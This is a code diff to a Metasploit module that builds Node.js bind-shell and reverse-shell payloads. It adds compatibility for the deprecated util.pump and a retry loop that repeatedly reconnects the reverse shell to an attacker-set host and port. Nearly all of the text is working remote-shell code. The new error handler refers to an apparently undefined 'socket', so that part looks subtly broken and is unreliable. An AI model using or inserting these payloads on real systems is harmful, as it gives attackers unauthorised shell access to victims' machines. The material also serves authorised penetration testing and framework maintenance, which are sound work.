@@ -1,5 +1,4 @@
 # -*- coding: binary -*-
-require 'msf/core'
 
 module Msf::Payload::NodeJS
   # Outputs a javascript snippet that spawns a bind TCP shell
@@ -18,8 +17,13 @@ module Msf::Payload::NodeJS
         var server = net.createServer(function(socket) {  
           var sh = cp.spawn(cmd, []);
           socket.pipe(sh.stdin);
-          util.pump(sh.stdout, socket);
-          util.pump(sh.stderr, socket);
+          if (typeof util.pump === "undefined") {
+            sh.stdout.pipe(socket);
+            sh.stderr.pipe(socket);
+          } else {
+            util.pump(sh.stdout, socket);
+            util.pump(sh.stderr, socket);
+          }
         });
         server.listen(#{datastore['LPORT']});
       })();
@@ -51,11 +55,27 @@ module Msf::Payload::NodeJS
             util = require("util"),
             sh = cp.spawn(cmd, []);
         var client = this;
-        client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
+        var counter=0;
+        function StagerRepeat(){
+          client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
           client.socket.pipe(sh.stdin);
-          util.pump(sh.stdout, client.socket);
-          util.pump(sh.stderr, client.socket);
+          if (typeof util.pump === "undefined") {
+            sh.stdout.pipe(client.socket);
+            sh.stderr.pipe(client.socket);
+          } else {
+            util.pump(sh.stdout, client.socket);
+            util.pump(sh.stderr, client.socket);
+          }
         });
+        socket.on("error", function(error) {
+          counter++;
+          if(counter<= #{datastore['StagerRetryCount']}){
+            setTimeout(function() { StagerRepeat();}, #{datastore['StagerRetryWait']}*1000);
+          } else
+            process.exit();
+          });
+        }
+        StagerRepeat();
       })();
     EOS
     cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')
